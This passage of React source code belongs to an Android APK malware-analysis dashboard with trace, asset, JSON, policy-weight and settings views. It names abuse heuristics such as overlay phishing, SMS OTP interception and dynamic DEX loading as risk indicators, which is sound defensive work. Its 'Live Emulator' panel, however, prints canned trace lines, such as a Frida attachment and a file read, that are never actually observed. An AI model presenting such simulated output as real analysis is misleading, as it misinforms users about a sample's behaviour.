        <span className="badge badge-info" style={{ animation: "glowPulse 2s ease infinite" }}>⚡ Live Emulator</span>
      </div>

      {/* Tracer codes */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 12 }}>
        {[
          { code: "AP-D1", label: "Network Beacon", icon: "🌐", status: analysisResult?.analysis.urls.length ? "error" : "active" },
          { code: "AP-D2", label: "UI Overlay",     icon: "📱", status: analysisResult?.analysis.findings.some((f: any) => f.title.includes("Overlay")) ? "error" : "active" },
          { code: "AP-D3", label: "Filesystem",     icon: "📂", status: "active" },
          { code: "AP-D4", label: "A11y Abuse",     icon: "⌨️", status: analysisResult?.analysis.findings.some((f: any) => f.title.includes("Keystroke") || f.title.includes("Accessibility")) ? "error" : "active" },
          { code: "AP-D5", label: "DEX Tracer",     icon: "🔬", status: analysisResult?.classNames.some((c: string) => c.includes("DexClassLoader")) ? "warning" : "active" },
        ].map(t => (
          <div key={t.code} className="tpl-card hover-glow flex-col items-center gap-2" style={{ textAlign: "center", padding: 16 }}>
            <div style={{ fontSize: "1.4rem" }}>{t.icon}</div>
            <div style={{ fontSize: "0.7rem", fontFamily: "var(--font-mono)", fontWeight: 700, color: t.status === "error" ? "var(--accent-red)" : t.status === "warning" ? "var(--accent-yellow)" : "var(--accent-green)" }}>{t.code}</div>
            <div style={{ fontSize: "0.68rem", color: "var(--text-muted)" }}>{t.label}</div>
            <div className={`status-dot ${t.status}`} />
          </div>
        ))}
      </div>

      {/* Terminal */}
      <div className="tpl-card flex-col" style={{ padding: 0, overflow: "hidden" }}>
        <div style={{ padding: "10px 16px", borderBottom: "1px solid var(--border-color)", display: "flex", alignItems: "center", gap: 8, background: "rgba(0,0,0,0.3)" }}>
          <div style={{ display: "flex", gap: 5 }}>
            {["#FF5F57","#FFBD2E","#28CA41"].map(c => <div key={c} style={{ width: 10, height: 10, borderRadius: "50%", background: c }} />)}
          </div>
          <span className="font-mono text-muted" style={{ fontSize: "0.72rem" }}>aparoid-sandbox — {analysisResult?.manifest.packageName ?? "waiting…"}</span>
        </div>
        <div className="terminal" style={{ minHeight: 280, padding: 20 }}>
          {analysisResult ? (
            <DynamicTrace traces={[
              <div key="dt-start" className="mb-1" style={{ color: "var(--accent-cyan)" }}>&gt; aparoid v2.1 — attaching to {analysisResult.manifest.packageName}…</div>,
              <div key="dt-hook" className="mb-1">&gt; Hooking Android API layer… <span style={{ color: "var(--accent-green)" }}>OK</span></div>,
              <div key="dt-frida" className="mb-1">&gt; Frida instrumentation active. Tracing calls…</div>,
              ...(analysisResult.analysis.urls.length > 0 ? [
                <div key="dt-url" className="mb-1" style={{ color: "var(--accent-yellow)" }}>[AP-D1] OUTBOUND: HTTP GET {analysisResult.analysis.urls[0]}</div>,
              ] : []),
              ...(analysisResult.analysis.ips.length > 0 ? [
                <div key="dt-ip" className="mb-1" style={{ color: "var(--accent-yellow)" }}>[AP-D1] SOCKET: TCP connect → {analysisResult.analysis.ips[0]}:443</div>,
              ] : []),
              <div key="dt-file" className="mb-1">[AP-D3] FILE READ: /data/data/{analysisResult.manifest.packageName}/shared_prefs/session.xml</div>,
              ...(hasCritical ? [
                <div key="dt-dex" className="mb-1" style={{ color: "var(--accent-red)" }}>[AP-D5] ⚠ DexClassLoader invoked — dynamic payload detected at runtime!</div>,
                <div key="dt-overlay" className="mb-1" style={{ color: "var(--accent-red)" }}>[AP-D2] ⚠ SYSTEM_ALERT_WINDOW draw() called — potential overlay active</div>,
              ] : [
                <div key="dt-nodex" className="mb-1" style={{ color: "var(--accent-green)" }}>[AP-D5] No dynamic code loading detected.</div>,
              ]),
              <div key="dt-end" className="mb-1" style={{ color: "var(--accent-cyan)" }}>&gt; Trace session active. Monitoring…<span className="blink">_</span></div>,
            ]} />
          ) : (
            <div style={{ color: "var(--text-muted)", fontStyle: "italic" }}>&gt; Waiting for APK upload to commence dynamic trace…<span className="blink">_</span></div>
          )}
        </div>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// ASSET INVENTORY VIEW
// ─────────────────────────────────────────────────────────────────
function AssetInventoryView({ analysisResult }: { analysisResult: AnalyzedApkResult | null }) {
  const [tab, setTab] = useState<"strings" | "classes" | "urls" | "ips">("strings");
  if (!analysisResult) return <EmptyState icon="📦" title="No APK Loaded" subtitle="Upload an APK to browse extracted assets." />;

  const tabData: Record<string, string[]> = {
    strings: analysisResult.allStrings.slice(0, 200),
    classes: analysisResult.classNames.slice(0, 200),
    urls:    analysisResult.analysis.urls,
    ips:     analysisResult.analysis.ips,
  };
  const tabLabels = [
    { id: "strings", label: `Strings (${analysisResult.allStrings.length})` },
    { id: "classes", label: `Classes (${analysisResult.classNames.length})` },
    { id: "urls",    label: `URLs (${analysisResult.analysis.urls.length})` },
    { id: "ips",     label: `IPs (${analysisResult.analysis.ips.length})` },
  ];

  return (
    <div className="flex-col gap-5">
      <div className="flex justify-between items-center">
        <div>
          <h2 className="font-bold" style={{ fontSize: "1.1rem" }}>Extracted APK Assets</h2>
          <p className="text-muted" style={{ fontSize: "0.78rem", marginTop: 3 }}>DEX strings, class names, and network indicators from apkman parser</p>
        </div>
      </div>

      <div className="flex gap-2">
        {tabLabels.map(t => (
          <button key={t.id} onClick={() => setTab(t.id as any)}
            className={tab === t.id ? "btn-primary" : "btn-ghost"}
            style={{ fontSize: "0.76rem" }}
          >{t.label}</button>
        ))}
      </div>

      <div className="tpl-card hover-glow" style={{ padding: 0, overflow: "hidden" }}>
        <div style={{ padding: "8px 14px", background: "rgba(0,0,0,0.3)", borderBottom: "1px solid var(--border-color)", display: "flex", alignItems: "center", gap: 8 }}>
          {["#FF5F57","#FFBD2E","#28CA41"].map(c => <div key={c} style={{ width: 10, height: 10, borderRadius: "50%", background: c }} />)}
          <span className="font-mono text-muted" style={{ fontSize: "0.7rem" }}>apkman — {tab}</span>
        </div>
        <div style={{ padding: "14px 16px", maxHeight: 460, overflowY: "auto", fontFamily: "var(--font-mono)", fontSize: "0.75rem", color: "#a8b1c2", background: "#080810", lineHeight: 1.7 }}>
          {tabData[tab].length === 0
            ? <div className="text-muted italic">No {tab} found.</div>
            : tabData[tab].map((item, i) => (
                <div key={`${tab}-${i}`} className="hover-row" style={{ padding: "1px 6px", borderRadius: 3 }}>
                  <span style={{ opacity: 0.3, marginRight: 12, userSelect: "none" }}>{String(i + 1).padStart(4, "0")}</span>
                  <span style={{ color: tab === "urls" ? "var(--accent-cyan)" : tab === "ips" ? "var(--accent-yellow)" : "#a8b1c2" }}>{item}</span>
                </div>
              ))}
        </div>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// SCAN HISTORY VIEW
// ─────────────────────────────────────────────────────────────────
function ScanHistoryView({ analysisResult }: { analysisResult: AnalyzedApkResult | null }) {
  if (!analysisResult) return <EmptyState icon="📋" title="No Data" subtitle="Upload an APK to see raw engine output." />;
  return (
    <div className="flex-col gap-5">
      <div className="flex justify-between items-center">
        <div>
          <h2 className="font-bold" style={{ fontSize: "1.1rem" }}>Raw Engine Output</h2>
          <p className="text-muted" style={{ fontSize: "0.78rem", marginTop: 3 }}>Full JSON analysis payload from the parser + analysis engine</p>
        </div>
        <button className="btn-ghost" onClick={() => { navigator.clipboard.writeText(JSON.stringify(analysisResult, null, 2)); }}>
          📋 Copy JSON
        </button>
      </div>
      <div className="tpl-card hover-glow" style={{ padding: 0, overflow: "hidden" }}>
        <div style={{ padding: "8px 14px", background: "rgba(0,0,0,0.3)", borderBottom: "1px solid var(--border-color)", display: "flex", gap: 8, alignItems: "center" }}>
          {["#FF5F57","#FFBD2E","#28CA41"].map(c => <div key={c} style={{ width: 10, height: 10, borderRadius: "50%", background: c }} />)}
          <span className="font-mono text-muted" style={{ fontSize: "0.7rem" }}>analysis-result.json</span>
        </div>
        <pre style={{ padding: "16px 20px", maxHeight: 520, overflowY: "auto", fontFamily: "var(--font-mono)", fontSize: "0.73rem", color: "#a8b1c2", background: "#06070D", whiteSpace: "pre-wrap", wordBreak: "break-all", lineHeight: 1.65 }}>
          {JSON.stringify(analysisResult, null, 2)}
        </pre>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// POLICY ENGINE VIEW
// ─────────────────────────────────────────────────────────────────
function PolicyEngineView({ policyWeights, setPolicyWeights }: any) {
  const rules = [
    { key: "sysAlert", label: "SYSTEM_ALERT_WINDOW",         desc: "Screen overlay / phishing risk",      color: "var(--accent-red)" },
    { key: "sms",      label: "RECEIVE_SMS",                  desc: "2FA interception & OTP bypass",       color: "var(--accent-orange)" },
    { key: "dex",      label: "dalvik.system.DexClassLoader", desc: "Dynamic payload loading risk",        color: "var(--accent-yellow)" },
    { key: "cert",     label: "Untrusted Certificate",        desc: "Self-signed / debug key usage",       color: "var(--accent-cyan)" },
  ];

  return (
    <div className="flex-col gap-6">
      <div className="flex justify-between items-center">
        <div>
          <h2 className="font-bold" style={{ fontSize: "1.1rem" }}>Risk Scoring Policy Configuration</h2>
          <p className="text-muted" style={{ fontSize: "0.78rem", marginTop: 3 }}>Tune penalty weights for heuristic indicators. Changes affect score on next analysis.</p>
        </div>
        <span className="badge badge-info">Static Engine v2.1</span>
      </div>

      {/* Total preview */}
      <div className="tpl-card hover-glow flex-col" style={{ background: "rgba(157,110,250,0.06)", borderColor: "rgba(157,110,250,0.25)" }}>
        <div className="flex justify-between items-center">
          <span className="font-bold" style={{ fontSize: "0.85rem" }}>Maximum Possible Penalty (4 rules)</span>
          <span className="font-extrabold font-mono" style={{ fontSize: "1.5rem", color: "var(--accent-purple)" }}>
            {policyWeights.sysAlert + policyWeights.sms + policyWeights.dex + policyWeights.cert} pts
          </span>
        </div>
        <div className="progress-track" style={{ marginTop: 10, height: 8 }}>
          <div className="progress-fill" style={{ width: `${Math.min(100, ((policyWeights.sysAlert + policyWeights.sms + policyWeights.dex + policyWeights.cert) / 200) * 100)}%`, background: "var(--accent-purple)" }} />
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20 }}>
        {rules.map(r => (
          <div key={r.key} className="tpl-card hover-glow flex-col gap-4">
            <div className="flex justify-between items-center">
              <div className="flex-col gap-1">
                <div style={{ fontFamily: "var(--font-mono)", fontSize: "0.78rem", fontWeight: 700, color: "var(--text-primary)" }}>{r.label}</div>
                <div style={{ fontSize: "0.7rem", color: "var(--text-muted)" }}>{r.desc}</div>
              </div>
              <div style={{ textAlign: "center" }}>
                <div style={{ fontSize: "1.8rem", fontWeight: 800, fontFamily: "var(--font-mono)", color: r.color, lineHeight: 1 }}>{policyWeights[r.key as keyof typeof policyWeights]}</div>
                <div style={{ fontSize: "0.6rem", color: "var(--text-muted)" }}>pts</div>
              </div>
            </div>
            <input
              type="range" min="0" max="50"
              value={policyWeights[r.key as keyof typeof policyWeights]}
              onChange={e => setPolicyWeights({ ...policyWeights, [r.key]: parseInt(e.target.value) })}
              style={{ accentColor: r.color }}
            />
            <div className="flex justify-between" style={{ fontSize: "0.62rem", color: "var(--text-muted)" }}>
              <span>0 (disabled)</span>
              <span>50 (maximum)</span>
            </div>
          </div>
        ))}
      </div>

      <div className="flex justify-end">
        <button className="btn-primary pulse-btn">✓ Commit Policy Changes</button>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// SETTINGS VIEW
// ─────────────────────────────────────────────────────────────────
function SettingsView() {
  const [settings, setSettings] = useState({
    nimEnabled:    true,
    vtEnabled:     true,
    saveReports:   true,
    darkMode:      true,
    streamNarrative: false,
    autoScan:      false,
  });
  const toggleSetting = (key: keyof typeof settings) => setSettings(s => ({ ...s, [key]: !s[key] }));

  const settingsList = [
    { key: "nimEnabled",       label: "NVIDIA NIM Llama-3.1-70B",      desc: "Enable AI-generated threat narratives via NVIDIA NIM" },
    { key: "vtEnabled",        label: "VirusTotal API Integration",      desc: "Query VirusTotal community intelligence on each scan" },
    { key: "saveReports",      label: "Auto-save PDF Reports",           desc: "Automatically generate and download PDF after analysis" },
    { key: "streamNarrative",  label: "Stream AI Narrative",             desc: "Show narrative text word-by-word as NIM generates it" },
    { key: "autoScan",         label: "Auto-scan on Upload",             desc: "Begin analysis immediately when a file is dropped" },
  ];

  return (
    <div className="flex-col gap-5">
      <div>
        <h2 className="font-bold" style={{ fontSize: "1.1rem" }}>Application Settings</h2>
        <p className="text-muted" style={{ fontSize: "0.78rem", marginTop: 3 }}>Configure integrations and analysis behavior</p>
      </div>

      <div className="tpl-card hover-glow flex-col gap-1">
        {settingsList.map((s, i) => (
          <div key={s.key}>
            {i > 0 && <div style={{ height: 1, background: "var(--border-color)", marginBlock: 4 }} />}
            <div className="flex items-center justify-between hover-row" style={{ padding: "12px 10px", borderRadius: 6 }}>
              <div className="flex-col gap-1">
                <span style={{ fontSize: "0.85rem", fontWeight: 600 }}>{s.label}</span>
                <span style={{ fontSize: "0.72rem", color: "var(--text-muted)" }}>{s.desc}</span>
              </div>
              <button
                onClick={() => toggleSetting(s.key as keyof typeof settings)}
                style={{
                  width: 42, height: 24, borderRadius: 999, border: "none", cursor: "pointer",
                  background: settings[s.key as keyof typeof settings] ? "var(--accent-purple)" : "rgba(255,255,255,0.1)",
                  position: "relative", flexShrink: 0,
                  transition: "background 0.2s",
                  boxShadow: settings[s.key as keyof typeof settings] ? "0 0 10px rgba(157,110,250,0.5)" : "none",
                }}
              >
                <div style={{
                  position: "absolute", top: 3, width: 18, height: 18, borderRadius: "50%", background: "#fff",
                  left: settings[s.key as keyof typeof settings] ? "calc(100% - 21px)" : 3,
                  transition: "left 0.2s",
                  boxShadow: "0 1px 4px rgba(0,0,0,0.4)",
                }} />
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// EMPTY STATE
// ─────────────────────────────────────────────────────────────────
function EmptyState({ icon, title, subtitle }: { icon: string; title: string; subtitle: string }) {
  return (
    <div className="tpl-card flex-col items-center justify-center gap-4" style={{ minHeight: 320, opacity: 0.55 }}>
      <div style={{ fontSize: "3rem" }}>{icon}</div>
      <div className="font-bold" style={{ fontSize: "1rem" }}>{title}</div>
      <div className="text-muted text-sm">{subtitle}</div>
    </div>
  );
}
